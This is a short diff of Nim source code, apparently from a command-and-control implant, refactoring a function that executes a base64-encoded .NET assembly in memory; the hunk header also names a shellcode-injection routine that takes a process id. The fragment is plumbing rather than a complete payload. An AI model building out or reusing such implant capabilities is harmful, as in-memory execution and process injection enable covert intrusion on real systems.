@@ -357,11 +357,10 @@ proc wrap_inject_shellc(shellc_base64: string, pid: int): bool =
 
 
 proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool =
-    var assembly_bytes = to_bytes(decode_64(assembly_base64, is_bin=true))
     var is_success: bool
     var output: string
     
-    (is_success, output) = execute_assembly(assembly_bytes, assembly_args.split(" "))
+    (is_success, output) = execute_assembly(assembly_base64, assembly_args)
     
     var data = {
         "is_success": $is_success,
